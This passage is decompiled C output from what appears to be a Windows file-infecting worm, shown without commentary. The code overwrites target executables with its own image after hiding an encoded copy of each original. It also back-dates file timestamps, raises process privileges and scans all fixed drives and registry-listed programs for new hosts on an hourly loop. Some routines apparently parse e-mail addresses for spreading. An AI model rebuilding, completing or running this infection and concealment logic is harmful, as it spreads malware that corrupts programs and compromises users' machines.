      v11 = ((v11 >> 12) + 1) << 12;
    if ( v10 < v14 )
      memset((void *)(v10 + v4), 0, 0x10u);
    v12 = v8[59];
    if ( v12 )
      v8[10] = v12;
    v2 = 1;
  }
  else
  {
    v11 = (unsigned int)lpFileName;
  }
  sub_401808((int)v13);
  if ( v2 )
    sub_40406E(lpFileName, v11);
  sub_405108(lpFileName);
  return v2;
}

//----- (004050B5) --------------------------------------------------------
unsigned int __cdecl sub_4050B5(_WORD *a1, unsigned int a2)
{
  unsigned int v2; // ecx
  unsigned int v4; // esi
  unsigned int v5; // eax
  __int16 v7; // [esp+0h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a2 >> 1 )
  {
    v4 = a2 >> 1;
    do
    {
      v2 = (((unsigned __int16)*a1 + v2) >> 16) + (unsigned __int16)(*a1 + v2);
      ++a1;
      --v4;
    }
    while ( v4 );
    v7 = v2;
  }
  v5 = HIWORD(v2);
  LOWORD(v5) = v7 + HIWORD(v2);
  return a2 + v5;
}

//----- (00405108) --------------------------------------------------------
_WORD *__cdecl sub_405108(LPCSTR lpFileName)
{
  unsigned int v1; // esi
  _WORD *result; // eax
  _WORD *v3; // edi
  unsigned int v4; // eax
  unsigned int *v5; // esi
  unsigned int v6; // eax
  char v7[16]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v7);
  v8 = 0;
  v1 = 0;
  result = sub_40174E((int)v7, lpFileName, (int)&v8, 0);
  v3 = result;
  if ( result )
  {
    v4 = sub_404CC5((int)result, v8);
    if ( v4 )
    {
      v5 = (unsigned int *)((char *)v3 + v4 + 88);
      if ( *v5 )
      {
        *v5 = 0;
        v6 = sub_4050B5(v3, v8);
        *v5 = v6;
      }
      else
      {
        v6 = (unsigned int)lpFileName;
      }
      v1 = v6;
    }
    sub_401808((int)v7);
    return (_WORD *)v1;
  }
  return result;
}

//----- (00405173) --------------------------------------------------------
int __cdecl sub_405173(LPCCH lpMultiByteStr)
{
  WCHAR WideCharStr[1024]; // [esp+0h] [ebp-800h] BYREF

  if ( dword_4938F0 || !dword_493910 )
    return 0;
  MultiByteToWideChar(0, 1u, lpMultiByteStr, -1, WideCharStr, 200);
  return dword_493910(0, WideCharStr);
}
// 4938F0: using guessed type int dword_4938F0;
// 493910: using guessed type int (__stdcall *dword_493910)(_DWORD, _DWORD);

//----- (004051BE) --------------------------------------------------------
__int16 __cdecl sub_4051BE(unsigned __int8 *a1, int a2)
{
  __int16 v4; // cx
  __int16 v5; // dx
  unsigned __int16 v6; // bx
  unsigned __int16 v7; // ax
  __int16 v8; // cx
  __int16 v9; // dx
  char v10; // cf
  __int16 v11; // t2

  v4 = -1;
  v5 = -1;
  do
  {
    v6 = 0;
    v7 = *a1++;
    LOBYTE(v7) = v4 ^ v7;
    LOBYTE(v8) = HIBYTE(v4);
    HIBYTE(v8) = v5;
    LOBYTE(v9) = HIBYTE(v5);
    HIBYTE(v9) = 8;
    do
    {
      v10 = v6 & 1;
      v6 >>= 1;
      v11 = v10 << 15;
      v10 = v7 & 1;
      v7 = (v7 >> 1) | v11;
      if ( v10 )
      {
        v7 ^= 0x8320u;
        v6 ^= 0xEDB8u;
      }
      --HIBYTE(v9);
    }
    while ( HIBYTE(v9) );
    v4 = v7 ^ v8;
    v5 = v6 ^ v9;
    --a2;
  }
  while ( a2 );
  return ~v4;
}

//----- (00405226) --------------------------------------------------------
int __cdecl sub_405226(LPCSTR lpFileName, LPCVOID lpBuffer, char *Source, int a4)
{
  DWORD v4; // edi
  unsigned __int16 v5; // si
  __int16 v6; // ax
  HANDLE FileA; // eax
  void *v8; // edi
  int v10; // eax
  __int16 Buffer; // [esp+Ch] [ebp-150h] BYREF
  unsigned __int8 v12; // [esp+Eh] [ebp-14Eh] BYREF
  __int16 v13; // [esp+Fh] [ebp-14Dh]
  unsigned __int16 v14; // [esp+11h] [ebp-14Bh]
  DWORD v15; // [esp+13h] [ebp-149h]
  DWORD v16; // [esp+17h] [ebp-145h]
  char v17; // [esp+1Bh] [ebp-141h]
  int v18; // [esp+1Ch] [ebp-140h]
  int v19; // [esp+20h] [ebp-13Ch]
  char v20; // [esp+24h] [ebp-138h]
  char v21; // [esp+25h] [ebp-137h]
  __int16 v22; // [esp+26h] [ebp-136h]
  int v23; // [esp+28h] [ebp-134h]
  char Destination[256]; // [esp+2Ch] [ebp-130h] BYREF
  char v25[16]; // [esp+12Ch] [ebp-30h] BYREF
  DWORD NumberOfBytesWritten; // [esp+13Ch] [ebp-20h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+140h] [ebp-1Ch] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+144h] [ebp-18h] BYREF
  HANDLE hFile; // [esp+154h] [ebp-8h]
  int v30; // [esp+158h] [ebp-4h]
  unsigned __int8 *lpBuffera; // [esp+168h] [ebp+Ch]

  v4 = 3;
  sub_40174B(v25);
  v5 = strlen(Source) + 32;
  GetLocalTime(&SystemTime);
  SystemTime.wMonth &= ~1u;
  SystemTime.wMinute -= sub_4047B6(0) % 0x1Eu;
  if ( SystemTime.wMinute >= 0x3Cu )
    SystemTime.wMinute = 1;
  LOWORD(v30) = (LOBYTE(SystemTime.wSecond) >> 1) & 0x1F | (32 * ((SystemTime.wHour << 6) | SystemTime.wMinute & 0x3F));
  v6 = BYTE2(v30) & 0x1F ^ ((SystemTime.wYear + 68) << 9);
  HIWORD(v30) = ((unsigned __int8)((32 * (SystemTime.wMonth & 0xF)) | v6 & 0x1F) ^ LOBYTE(SystemTime.wDay)) & 0x1F ^ ((32 * (SystemTime.wMonth & 0xF)) | v6 & 0xFE1F);
  if ( a4 )
    v4 = 2;
  SetFileAttributesA(lpFileName, 0x20u);
  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, v4, 0x20u, 0);
  v8 = FileA;
  hFile = FileA;
  if ( FileA == (HANDLE)-1 )
    return 0;
  SetFilePointer(FileA, 0, 0, 2u);
  lpBuffera = (unsigned __int8 *)sub_40174E((int)v25, (LPCSTR)lpBuffer, (int)&nNumberOfBytesToWrite, 1);
  if ( !lpBuffera )
  {
    CloseHandle(v8);
    return 0;
  }
  v12 = 116;
  v13 = 0x8000;
  v14 = v5;
  v15 = nNumberOfBytesToWrite;
  v16 = nNumberOfBytesToWrite;
  v17 = 0;
  LOWORD(v10) = sub_4051BE(lpBuffera, nNumberOfBytesToWrite);
  v18 = v10;
  v20 = 20;
  v19 = v30;
  v21 = 48;
  v22 = strlen(Source);
  v23 = 0;
  strcpy(Destination, Source);
  Buffer = sub_4051BE(&v12, v5 - 2);
  if ( a4 )
    WriteFile(hFile, &unk_410DAC, 0x14u, &NumberOfBytesWritten, 0);
  WriteFile(hFile, &Buffer, v5, &NumberOfBytesWritten, 0);
  WriteFile(hFile, lpBuffera, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
  sub_401808((int)v25);
  CloseHandle(hFile);
  if ( a4 )
    sub_405522(lpFileName);
  return 1;
}
// 40536A: variable 'v10' is possibly undefined
// 405226: using guessed type char Destination[256];

//----- (0040542A) --------------------------------------------------------
int sub_40542A()
{
  int result; // eax
  int v1; // [esp+0h] [ebp-4h] BYREF

  v1 = 0;
  result = 1;
  if ( dword_493914 )
    return dword_493914(&v1, 0);
  return result;
}
// 493914: using guessed type int (__stdcall *dword_493914)(_DWORD, _DWORD);

//----- (00405449) --------------------------------------------------------
int __cdecl sub_405449(HANDLE ProcessHandle, LPCSTR lpName)
{
  HANDLE CurrentProcess; // eax
  int result; // eax
  struct _TOKEN_PRIVILEGES PreviousState; // [esp+4h] [ebp-660h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+644h] [ebp-20h] BYREF
  DWORD ReturnLength; // [esp+654h] [ebp-10h] BYREF
  struct _LUID Luid; // [esp+658h] [ebp-Ch] BYREF
  int v8; // [esp+660h] [ebp-4h]

  CurrentProcess = ProcessHandle;
  ReturnLength = 1600;
  v8 = 0;
  if ( !ProcessHandle )
    CurrentProcess = GetCurrentProcess();
  result = OpenProcessToken(CurrentProcess, 0x28u, &ProcessHandle);
  if ( result )
  {
    if ( LookupPrivilegeValueA(0, lpName, &Luid) )
    {
      NewState.Privileges[0].Luid = Luid;
      NewState.PrivilegeCount = 0;
      NewState.Privileges[0].Attributes = 0;
      AdjustTokenPrivileges(ProcessHandle, 0, &NewState, 0x10u, &PreviousState, &ReturnLength);
      if ( !GetLastError() )
      {
        PreviousState.Privileges[0].Attributes |= 2u;
        PreviousState.Privileges[0].Luid = Luid;
        PreviousState.PrivilegeCount = 1;
        AdjustTokenPrivileges(ProcessHandle, 0, &PreviousState, 0x10u, 0, 0);
        if ( !GetLastError() )
          v8 = 1;
      }
    }
    CloseHandle(ProcessHandle);
    return v8;
  }
  return result;
}

//----- (00405522) --------------------------------------------------------
HANDLE __cdecl sub_405522(LPCSTR lpFileName)
{
  HANDLE result; // eax
  HANDLE v2; // edi
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME FileTime; // [esp+18h] [ebp-8h] BYREF

  result = CreateFileA(lpFileName, 0xC0000000, 1u, 0, 3u, 0x20u, 0);
  v2 = result;
  if ( result )
  {
    GetSystemTime(&SystemTime);
    SystemTime.wMinute = sub_4047B6(0) % 0x3Cu;
    SystemTime.wHour -= sub_4047B6(0) % 0x18u;
    if ( (__int16)SystemTime.wHour <= 0 )
    {
      SystemTime.wHour += 24;
      --SystemTime.wDay;
    }
    SystemTime.wDay -= sub_4047B6(0) % 0x1Cu;
    if ( (__int16)SystemTime.wDay <= 0 )
      SystemTime.wDay = sub_4047B6(0) % 3u;
    SystemTime.wMonth -= sub_4047B6(0) % 0xCu;
    if ( (__int16)SystemTime.wMonth <= 0 )
    {
      SystemTime.wMonth += 12;
      --SystemTime.wYear;
    }
    SystemTimeToFileTime(&SystemTime, &FileTime);
    SetFileTime(v2, &FileTime, &FileTime, &FileTime);
    return (HANDLE)CloseHandle(v2);
  }
  return result;
}

//----- (004055FE) --------------------------------------------------------
int sub_4055FE()
{
  DWORD Version; // eax
  char *v1; // eax
  char *v3; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-94h] BYREF

  sub_4047B6(1);
  memset(byte_4937EC, 0, sizeof(byte_4937EC));
  memset(&FullPath, 0, 0x104u);
  memset(&ApplicationName, 0, 0x104u);
  memset(Destination, 0, sizeof(Destination));
  memset(ServiceName, 0, sizeof(ServiceName));
  sub_403634((int)aS, 8806, byte_40F0D0);
  sub_402680(&dword_4938F8);
  Version = GetVersion();
  dword_493900 = 0;
  dword_4938F0 = Version & 0x80000000;
  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);
  if ( VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 1 )
    dword_493900 = 1;
  sub_404A18();
  v1 = (char *)operator new(0x7D000u);
  dword_4933D8 = v1;
  if ( !v1 )
    return 0;
  memset(v1, 0, 0x7D000u);
  sub_4057BE();
  v3 = sub_40347E(Name, 1);
  sub_405449(0, v3);
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F8: using guessed type int dword_4938F8;
// 493900: using guessed type int dword_493900;

//----- (00405705) --------------------------------------------------------
const char *__cdecl sub_405705(LPCSTR lpFileName, char *Str)
{
  const char *result; // eax
  const char *v3; // edi
  int v4; // esi
  int v5; // esi
  size_t v6; // ebx
  char *v7; // edi
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = (const char *)sub_40174E((int)v8, lpFileName, (int)&v9, 0);
  v3 = result;
  if ( result )
  {
    v4 = 4096;
    if ( (unsigned int)v9 >= 0x1000 )
    {
      v6 = strlen(Str);
      if ( (unsigned int)(v9 - 1000) > 0x1000 )
      {
        while ( strncmp(Str, &v3[v4], v6) )
        {
          if ( ++v4 >= (unsigned int)(v9 - 1000) )
            goto LABEL_9;
        }
        v7 = (char *)&v3[v4 + 20];
        sub_403634((int)v7, 8806, v7 - 4);
        memcpy(v7, Str + 20, 0x2266u);
        sub_4035A1((int)(v7 - 4));
        sub_4035D8((int)v7, 8806, v7 - 4);
      }
LABEL_9:
      v5 = 1;
    }
    else
    {
      v5 = 0;
    }
    sub_401808((int)v8);
    return (const char *)v5;
  }
  return result;
}

//----- (004057BE) --------------------------------------------------------
HMODULE sub_4057BE()
{
  char *v0; // eax
  HMODULE LibraryA; // ebp
  char *v2; // eax
  char *v3; // eax
  char *v4; // eax
  char *v5; // eax
  HMODULE v6; // ebp
  char *v7; // eax
  HMODULE result; // eax
  HMODULE v9; // ebx
  char *v10; // eax

  v0 = sub_40347E(LibFileName, 2);
  LibraryA = LoadLibraryA(v0);
  if ( LibraryA )
  {
    v2 = sub_40347E(ProcName, 1);
    dword_493908 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(LibraryA, v2);
    v3 = sub_40347E(ProcName, 4);
    dword_493904 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(LibraryA, v3);
    v4 = sub_40347E(ProcName, 5);
    dword_49390C = (int (__stdcall *)(_DWORD))GetProcAddress(LibraryA, v4);
  }
  v5 = sub_40347E(LibFileName, 3);
  v6 = LoadLibraryA(v5);
  if ( v6 )
  {
    v7 = sub_40347E(ProcName, 3);
    dword_493910 = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress(v6, v7);
  }
  result = LoadLibraryA(aU);
  v9 = result;
  if ( result )
  {
    v10 = sub_40347E(aU, 1);
    result = (HMODULE)GetProcAddress(v9, v10);
    dword_493914 = (int (__stdcall *)(_DWORD, _DWORD))result;
  }
  return result;
}
// 493904: using guessed type int (__stdcall *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD);
// 493908: using guessed type int (__stdcall *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD);
// 49390C: using guessed type int (__stdcall *dword_49390C)(_DWORD);
// 493910: using guessed type int (__stdcall *dword_493910)(_DWORD, _DWORD);
// 493914: using guessed type int (__stdcall *dword_493914)(_DWORD, _DWORD);

//----- (00405873) --------------------------------------------------------
int __cdecl sub_405873(LPCSTR lpFileName)
{
  char *v2; // eax
  char Source[260]; // [esp+10h] [ebp-64Ch] BYREF
  char v5[260]; // [esp+114h] [ebp-548h] BYREF
  CHAR Filename[260]; // [esp+218h] [ebp-444h] BYREF
  char v7[260]; // [esp+31Ch] [ebp-340h] BYREF
  CHAR FileName[260]; // [esp+420h] [ebp-23Ch] BYREF
  CHAR NewFileName[260]; // [esp+524h] [ebp-138h] BYREF
  struct _FILETIME CreationTime; // [esp+628h] [ebp-34h] BYREF
  char v11[16]; // [esp+640h] [ebp-1Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+650h] [ebp-Ch] BYREF
  size_t v13; // [esp+654h] [ebp-8h] BYREF
  int v14; // [esp+658h] [ebp-4h]
  LPCSTR lpFileNamea; // [esp+664h] [ebp+8h]
  LPCSTR lpFileNameb; // [esp+664h] [ebp+8h]
  unsigned int *lpFileNamec; // [esp+664h] [ebp+8h]

  sub_40174B(v11);
  nNumberOfBytesToWrite = 0;
  if ( sub_404825(lpFileName) || sub_405173(lpFileName) )
    return 0;
  v14 = sub_4034AE(aW, 0);
  _splitpath(lpFileName, 0, 0, v5, 0);
  lpFileNamea = 0;
  if ( v14 > 0 )
  {
    do
    {
      v2 = sub_40347E(aW, (int)lpFileNamea);
      if ( *v2 )
      {
        if ( sub_403C88(v5, v2) )
          return 0;
      }
    }
    while ( (int)++lpFileNamea < v14 );
  }
  sub_403E97(NewFileName);
  GetModuleFileNameA(0, Filename, 0x104u);
  if ( !CopyFileA(Filename, NewFileName, 0) )
    return 0;
  SetFileAttributesA(NewFileName, 0x20u);
  if ( !sub_404E1A(NewFileName, lpFileName, 86016)
    || (lpFileNameb = (LPCSTR)sub_40174E((int)v11, lpFileName, (int)&v13, 0)) == 0 )
  {
LABEL_17:
    sub_403F05(NewFileName);
    return 0;
  }
  if ( v13 <= 0x15000 )
    goto LABEL_16;
  if ( v13 >= 0x300000 )
    goto LABEL_16;
  _splitpath(lpFileName, FileName, Source, Filename, 0);
  strcat(FileName, Source);
  strcat(FileName, Filename);
  strcat(FileName, asc_40F0AC);
  sub_40372F(v7, 3, 3, 4);
  v7[0] = tolower(v7[0]);
  strcat(FileName, v7);
  lpFileNamec = sub_40745D((int)lpFileNameb, v13, (int)&nNumberOfBytesToWrite);
  if ( !lpFileNamec )
  {
LABEL_16:
    sub_401808((int)v11);
    goto LABEL_17;
  }
  sub_401808((int)v11);
  sub_403DC6(FileName, lpFileNamec, nNumberOfBytesToWrite);
  sub_405522(FileName);
  SetFileAttributesA(FileName, 0x27u);
  v14 = sub_404138(lpFileName, &CreationTime);
  SetFileAttributesA(lpFileName, 0x20u);
  CopyFileA(NewFileName, lpFileName, 0);
  sub_403F05(NewFileName);
  strcpy(&byte_4100D4, FileName);
  sub_405705(lpFileName, &String1);
  if ( v14 )
    sub_404180(lpFileName, &CreationTime);
  operator delete(lpFileNamec);
  return 1;
}

//----- (00405B0F) --------------------------------------------------------
int __cdecl sub_405B0F(char *FullPath)
{
  int *v1; // esi
  _BYTE *v2; // esi
  int v4; // esi
  CHAR *CommandLineA; // eax
  HANDLE v6; // eax
  char Filename[260]; // [esp+4h] [ebp-428h] BYREF
  char Source[260]; // [esp+108h] [ebp-324h] BYREF
  char Ext; // [esp+20Ch] [ebp-220h] BYREF
  char v10[259]; // [esp+20Dh] [ebp-21Fh] BYREF
  char Destination[260]; // [esp+310h] [ebp-11Ch] BYREF
  char v12[16]; // [esp+414h] [ebp-18h] BYREF
  int v13; // [esp+424h] [ebp-8h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+428h] [ebp-4h] BYREF

  sub_40174B(v12);
  nNumberOfBytesToWrite = 0;
  v1 = (int *)sub_40174E((int)v12, FullPath, (int)&v13, 1);
  if ( !v1 )
    return 0;
  _splitpath(FullPath, Destination, Source, Filename, &Ext);
  strcat(Destination, Source);
  strcat(Destination, Filename);
  v10[4] = 0;
  strcat(Destination, v10);
  strcat(Destination, &byte_4101DC);
  v2 = sub_40756C(v1, v13, &nNumberOfBytesToWrite);
  if ( !v2 )
  {
    sub_401808((int)v12);
    return 0;
  }
  sub_401808((int)v12);
  sub_403DC6(Destination, v2, nNumberOfBytesToWrite);
  operator delete(v2);
  v4 = 0;
  CommandLineA = GetCommandLineA();
  v6 = sub_4047E2(Destination, CommandLineA);
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    sub_403F05(Destination);
    return 1;
  }
  return v4;
}

//----- (00405C2E) --------------------------------------------------------
int __cdecl sub_405C2E(char *Destination, int a2)
{
  char *v2; // eax
  CHAR FileName[260]; // [esp+0h] [ebp-104h] BYREF

  v2 = sub_40347E(SubKey, 5);
  sub_4045EF(HKEY_CURRENT_USER, v2, byte_4131A0, (LPBYTE)FileName, (HKEY)0x104);
  return sub_404555(FileName, Destination, a2, 1);
}

//----- (00405C7A) --------------------------------------------------------
int __cdecl sub_405C7A(char *FullPath, int a2)
{
  int v2; // edi
  int v3; // edi
  char *v4; // eax
  int v5; // edi
  char *v6; // eax
  char *v7; // eax
  char *v8; // esi
  int v9; // eax
  int v10; // edi
  DWORD v11; // edx
  char Source[260]; // [esp+Ch] [ebp-20Ch] BYREF
  char Destination[260]; // [esp+110h] [ebp-108h] BYREF
  int v15; // [esp+214h] [ebp-4h]
  int i; // [esp+224h] [ebp+Ch]
  int v17; // [esp+224h] [ebp+Ch]

  v15 = 0;
  if ( !a2 )
  {
    v2 = sub_4034AE(aNv, 0);
    Destination[0] = 0;
    _splitpath(FullPath, 0, 0, Destination, Source);
    v3 = v2 - 1;
    for ( i = 0; i < v3; ++i )
    {
      v4 = sub_40347E(aNv, i);
      if ( !_strcmpi(Destination, v4) && i != v3 )
        v15 = 1;
    }
    strcat(Destination, Source);
    v5 = 0;
    v17 = sub_4034AE(aV, 0);
    if ( v17 > 0 )
    {
      do
      {
        v6 = sub_40347E(aV, v5);
        if ( !_strcmpi(Destination, v6) )
          v15 = 1;
        ++v5;
      }
      while ( v5 < v17 );
    }
    if ( v15 )
    {
      v7 = sub_40347E(byte_410DF0, 1);
      v8 = FullPath;
      if ( !sub_403C88(FullPath, v7) )
      {
        sub_403F05(FullPath);
        return 1;
      }
    }
    else
    {
      v8 = FullPath;
    }
    v9 = sub_403D4B(v8);
    v10 = v9;
    if ( v9 < 0 )
    {
      if ( v9 == -100 )
        sub_40704C(v8, -1, -1, 0);
    }
    else
    {
      strcpy(&::FullPath, v8);
      if ( v10 < 5 )
      {
        strcpy(byte_4937EC, v8);
        sub_404555(v8, dword_4933D8, 512000, 1);
      }
    }
    v11 = 300 * dword_493918;
    if ( 300 * dword_493918 > 7000 )
      v11 = 1000 * (sub_4047B6(0) % 5u + 7);
    Sleep(v11);
    if ( ++dword_493918 > 10000 )
      dword_493918 = 0;
  }
  return 1;
}
// 493918: using guessed type int dword_493918;

//----- (00405E27) --------------------------------------------------------
int __cdecl sub_405E27(char *FullPath, int a2, int a3)
{
  size_t v3; // eax
  int v4; // eax
  char Filename[260]; // [esp+4h] [ebp-30Ch] BYREF
  char v7[260]; // [esp+108h] [ebp-208h] BYREF
  char Str[260]; // [esp+20Ch] [ebp-104h] BYREF

  _splitpath(FullPath, 0, Str, Filename, 0);
  if ( !a2 )
  {
    if ( a3 )
    {
      v4 = sub_403D0C(Filename);
    }
    else
    {
      v3 = strlen(Str);
      if ( v3 )
        v7[v3 + 259] = 0;
      _splitpath(Str, 0, 0, v7, 0);
      v4 = sub_403D0C(v7);
    }
    if ( v4 )
      sub_404555(FullPath, dword_4933D8, 512000, 1);
  }
  return 1;
}

//----- (00405EC6) --------------------------------------------------------
int __cdecl sub_405EC6(char *Source)
{
  int v1; // esi
  int result; // eax

  v1 = 1;
  result = (int)sub_403C88(Source, &aOtor[1]);
  if ( result )
  {
    if ( sub_403C88(Source, aOtor) )
      v1 = 0;
    sub_403F1C(Source, (int)sub_405E27, v1);
    return 1;
  }
  return result;
}

//----- (00405F08) --------------------------------------------------------
int __cdecl sub_405F08(int a1, char *Source, char *a3, int a4)
{
  int v4; // edi
  char *v5; // eax
  char Destination[1024]; // [esp+Ch] [ebp-B0Ch] BYREF
  CHAR Dst[1024]; // [esp+40Ch] [ebp-70Ch] BYREF
  char Filename[260]; // [esp+80Ch] [ebp-30Ch] BYREF
  char Dir[260]; // [esp+910h] [ebp-208h] BYREF
  CHAR Src[260]; // [esp+A14h] [ebp-104h] BYREF
  int v12; // [esp+B2Ch] [ebp+14h]

  *(_DWORD *)a4 = 0;
  strcpy(Destination, Source);
  strcat(Destination, asc_40F044);
  strcat(Destination, a3);
  sub_4045EF(HKEY_LOCAL_MACHINE, Destination, 0, (LPBYTE)Dst, (HKEY)0x400);
  strcpy(Src, Dst);
  ExpandEnvironmentStringsA(Src, Dst, 0x104u);
  v12 = sub_4034AE(aNv, 0);
  _splitpath(Dst, 0, 0, Filename, 0);
  v4 = 0;
  if ( v12 <= 0 )
    goto LABEL_11;
  do
  {
    v5 = sub_40347E(aNv, v4);
    if ( *v5 && sub_403C88(Filename, v5) )
      break;
    ++v4;
  }
  while ( v4 < v12 );
  if ( v4 >= v12 )
  {
LABEL_11:
    if ( sub_403C88(Dst, &byte_410D23) )
      sub_405873(Dst);
  }
  _splitpath(Dst, Src, Dir, 0, 0);
  strcat(Src, Dir);
  sub_405EC6(Src);
  Sleep(0x3E8u);
  return 1;
}

//----- (00406066) --------------------------------------------------------
void __stdcall __noreturn sub_406066(LPVOID lpThreadParameter)
{
  char Destination[260]; // [esp+0h] [ebp-108h] BYREF
  int v2; // [esp+104h] [ebp-4h] BYREF

  while ( 1 )
  {
    Destination[0] = 0;
    sub_403CE3(Destination, 1);
    sub_404691(HKEY_LOCAL_MACHINE, Destination, (int)sub_405F08, (int)&v2);
    Sleep(0x36EE80u);
  }
}

//----- (004060AE) --------------------------------------------------------
BOOL __cdecl sub_4060AE(char *Source, int a2, int a3)
{
  int v3; // eax

  if ( a2 )
  {
    return !sub_405EC6(Source) && a3 == 0;
  }
  else
  {
    if ( !a3 )
      Sleep(5u);
    v3 = sub_403D4B(Source);
    if ( v3 >= 0 && v3 < 3 )
      strcpy(byte_4937EC, Source);
    return 1;
  }
}

//----- (00406106) --------------------------------------------------------
int __stdcall sub_406106(int a1)
{
  char *v1; // eax
  char v2; // bl
  char v3; // al
  UINT DriveTypeA; // eax
  CHAR RootPathName[2]; // [esp+4h] [ebp-10Ch] BYREF
  char v7; // [esp+6h] [ebp-10Ah]
  int v8; // [esp+108h] [ebp-8h]
  char v9; // [esp+10Fh] [ebp-1h]

  RootPathName[0] = 0;
  v1 = sub_40347E(aOtor, 1);
  sub_4045EF(HKEY_LOCAL_MACHINE, SubKey, v1, (LPBYTE)RootPathName, (HKEY)0x104);
  sub_405EC6(RootPathName);
  v2 = v7;
  v3 = tolower(RootPathName[0]);
  v8 = 0;
  v9 = v3;
  do
  {
    if ( (_BYTE)v8 + 97 != v9 )
    {
      v7 = 0;
      RootPathName[0] = v8 + 97;
      DriveTypeA = GetDriveTypeA(RootPathName);
      v7 = v2;
      if ( DriveTypeA == 3 )
        sub_403F1C(RootPathName, (int)sub_4060AE, a1);
    }
    ++v8;
  }
  while ( v8 < 26 );
  return 0;
}

//----- (004061C0) --------------------------------------------------------
int __cdecl sub_4061C0(char *Str, char *Destination)
{
  signed int v2; // eax
  signed int i; // ecx

  strcpy(Destination, aU_0);
  v2 = strlen(Str);
  for ( i = 0; i < v2; ++i )
  {
    if ( Str[i] == 64 )
      break;
  }
  if ( i >= v2 - 1 )
    return 0;
  strcat(Destination, &Str[i + 1]);
  return 1;
}

//----- (0040620B) --------------------------------------------------------
BOOL __cdecl sub_40620B(char *Destination, char *Str, int a3)
{
  int v4; // eax
  int v5; // esi
  char v6[432]; // [esp+4h] [ebp-214h] BYREF
  char Source[100]; // [esp+1B4h] [ebp-64h] BYREF

  if ( !Data[0] || !byte_4931D0[0] )
    return 0;
  if ( a3 )
  {
    sub_401841(Destination);
    sub_402319(Destination, Str);
  }
  sub_402C3B(v6, (char *)Data, 25, 0x100u, 100);
  sub_40372F(Source, 3, 10, 4);
  sub_4030BF(v6, Source);
  sub_40317D(v6, Destination + 100);
  sub_4030D4((int)v6, (char *)byte_4931D0);
  if ( sub_402D72((int)v6) )
  {
    sub_402D0D((int)v6);
    return 0;
  }
  v4 = strlen(Str);
  v5 = sub_402DCE((int)v6, Str, v4);
  sub_402D0D((int)v6);
  return v5 == 0;
}
// 4931D0: using guessed type BYTE byte_4931D0[260];
// 4932D4: using guessed type BYTE Data[260];

//----- (004062F0) --------------------------------------------------------
BOOL __cdecl sub_4062F0(char *a1, char *Str, int a3)
{
  int v4; // eax
  int v5; // esi
  char Destination[260]; // [esp+4h] [ebp-318h] BYREF
  char v7[432]; // [esp+108h] [ebp-214h] BYREF
  char Source[100]; // [esp+2B8h] [ebp-64h] BYREF

  if ( !sub_4061C0(a1, Destination) )
    return 0;
  if ( a3 )
  {
    sub_401841(a1);
    sub_402319(a1, Str);
  }
  sub_402C3B(v7, Destination, 25, 0x100u, 100);
  sub_40372F(Source, 3, 10, 4);
  sub_4030BF(v7, Source);
  sub_40317D(v7, a1 + 100);
  sub_4030D4((int)v7, a1);
  if ( sub_402D72((int)v7) )
  {
    sub_402D0D((int)v7);
    return 0;
  }
  v4 = strlen(Str);
  v5 = sub_402DCE((int)v7, Str, v4);
  sub_402D0D((int)v7);
  return v5 == 0;
}

//----- (004063D4) --------------------------------------------------------
BOOL __cdecl sub_4063D4(char *Str, char *a2)
{
  char String1[1024]; // [esp+0h] [ebp-800h] BYREF
  char String2[1024]; // [esp+400h] [ebp-400h] BYREF

  String1[0] = 0;
  String2[0] = 0;
  sub_4061C0(Str, String1);
  sub_4061C0(a2, String2);
  return _strcmpi(String1, String2) == 0;
}

//----- (00406426) --------------------------------------------------------
int __cdecl sub_406426(char *Source)
{
  int v1; // edi
  int v2; // ebx
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  char *v6; // eax
  int i; // edi
  char *v9; // [esp-8h] [ebp-24h]
  char *v10; // [esp-8h] [ebp-24h]
  int v11; // [esp+Ch] [ebp-10h]
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]
  int Destination; // [esp+18h] [ebp-4h]

  Destination = -1;
  v1 = 0;
  v14 = 0;
  if ( !sub_4033F4(aS, Source, 4096, 1) )
  {
    v13 = sub_4034AE(aS, 0);
    if ( v13 > 0 )
    {
      do
      {
        v2 = 0;
        v11 = 0;
        if ( v1 <= 0 )
          goto LABEL_8;
        do
        {
          v9 = sub_40347E(aS, v2);
          v3 = sub_40347E(aS, v1);
          if ( sub_4063D4(v3, v9) )
            v11 = 1;
          ++v2;
        }
        while ( v2 < v1 );
        if ( !v11 )
        {
LABEL_8:
          v4 = v1 + 1;
          v5 = 1;
          v12 = 1;
          if ( v1 + 1 < v13 )
          {
            do
            {
              v10 = sub_40347E(aS, v4);
              v6 = sub_40347E(aS, v1);
              if ( sub_4063D4(v6, v10) )
                ++v12;
              ++v4;
            }
            while ( v4 < v13 );
            v5 = v12;
          }
          if ( v5 > v14 )
          {
            v14 = v5;
            Destination = v1;
          }
        }
        ++v1;
      }
      while ( v1 < v13 );
      if ( v14 > 0 && Destination >= 0 )
        sub_4034E0(aS, (char *)Destination, 4096);
    }
    for ( i = 0; i < 10; ++i )
    {
      if ( sub_4033F4(aS, Source, 4096, 1) )
        break;
